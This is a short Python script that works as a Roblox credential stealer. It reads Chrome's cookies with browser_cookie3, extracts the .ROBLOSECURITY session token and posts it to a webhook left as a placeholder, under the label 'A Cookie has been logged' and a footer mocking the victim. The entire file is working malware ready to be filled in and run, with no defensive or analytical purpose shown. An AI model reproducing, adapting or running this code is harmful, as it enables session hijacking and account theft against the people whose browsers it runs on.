import browser_cookie3 as cum
import requests
import threading
import time
import os

webhook = "YOUR WEBHOOK HERE"
def main():
    try:
        getcookie = cum.chrome(domain_name='roblox.com')
        cookies = str(getcookie)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        ok = {
            "username": "Logger Waifu",
            "avatar_url": "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/649adf24-60c9-4b7c-8ccf-e828ce51825d/dddqxj0-12dc5989-6e8e-4a0f-bf9f-887a5db96b18.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOiIsImlzcyI6InVybjphcHA6Iiwib2JqIjpbW3sicGF0aCI6IlwvZlwvNjQ5YWRmMjQtNjBjOS00YjdjLThjY2YtZTgyOGNlNTE4MjVkXC9kZGRxeGowLTEyZGM1OTg5LTZlOGUtNGEwZi1iZjlmLTg4N2E1ZGI5NmIxOC5wbmcifV1dLCJhdWQiOlsidXJuOnNlcnZpY2U6ZmlsZS5kb3dubG9hZCJdfQ.kHjYfE48SYiPGR0M3GHDyRNbP8Iw87SumhIH7pjOKUo",
            "embeds": [
                {
                "color": 14387362,
                "fields": [
                {
                    "name": f"A Cookie has been logged.",
                    "value": f"```{cookie}```"
                },
                ],
                "footer": {
                "text": f"Whatta retard."
                }
                }
            ]
        }
        requests.post(f"{webhook}", json=ok)
    except:
        print("error")
threading.Thread(target=main,).start()